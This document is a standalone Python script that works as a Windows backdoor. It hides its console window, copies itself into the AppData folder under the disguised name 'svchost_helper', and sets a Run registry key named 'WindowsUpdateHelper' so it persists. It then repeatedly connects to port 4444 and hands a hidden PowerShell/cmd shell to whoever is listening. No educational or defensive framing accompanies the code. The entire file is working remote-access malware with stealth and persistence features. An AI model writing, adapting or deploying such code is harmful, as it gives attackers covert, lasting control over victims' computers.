import socket
import subprocess
import os
import time
import sys
import ctypes
import shutil

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def persist():
    try:
        src = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        appdata = os.environ.get("APPDATA", "")
        if not appdata:
            return
        dest_dir = os.path.join(appdata, "Microsoft", "Windows")
        os.makedirs(dest_dir, exist_ok=True)
        dest = os.path.join(dest_dir, "svchost_helper.exe" if getattr(sys, "frozen", False) else "svchost_helper.py")
        try:
            shutil.copy2(src, dest)
        except Exception:
            pass
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        cmd = f'"{dest}"' if dest.endswith(".exe") else f'pythonw.exe "{dest}"'
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception:
        pass

def connect():
    hide_console()
    persist()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(12)
            s.connect(("127.0.0.1", 4444))
            s.settimeout(None)
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            try:
                subprocess.call(["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-C", "cmd.exe"])
            except Exception:
                subprocess.call(["cmd.exe", "/c", "cmd.exe"])
            s.close()
        except Exception:
            time.sleep(9)
            continue

if __name__ == "__main__":
    connect()
